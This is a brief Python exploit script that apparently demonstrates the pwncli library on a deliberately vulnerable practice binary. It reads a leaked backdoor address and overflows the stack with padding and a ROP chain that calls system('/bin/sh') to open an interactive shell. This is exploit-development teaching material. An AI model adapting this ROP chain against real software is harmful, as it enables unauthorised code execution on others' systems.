#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
# python3 exp.py de ./stackoverflow_nopie

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io'] 
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# get gadgets from current file
log_ex("Use CurrentGadgets API.")
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=True)


log_ex("To send name.")
io.sendafter("read your name: \n", "roderick")
stop()
msg = rl().decode()
log_ex("Msg recv: %r" % msg)

# recvuntil
ru("back door address: ")
msg = rl()[:-1]
backdoor_address = int16_ex(msg)
leak("backdoor_address", backdoor_address)

if elf.pie:
    set_current_code_base_and_log(backdoor_address, "backdoor")

ret = CurrentGadgets.ret()
# to execute backdoor
log_ex("To execute backdoor.")
io.sendafter("please input: ", b"a"*0x18 + p64(ret) + p64(CurrentGadgets.pop_rdi_ret()) + p64(CurrentGadgets.bin_sh()) +  p64(elf.sym.system))

ia()
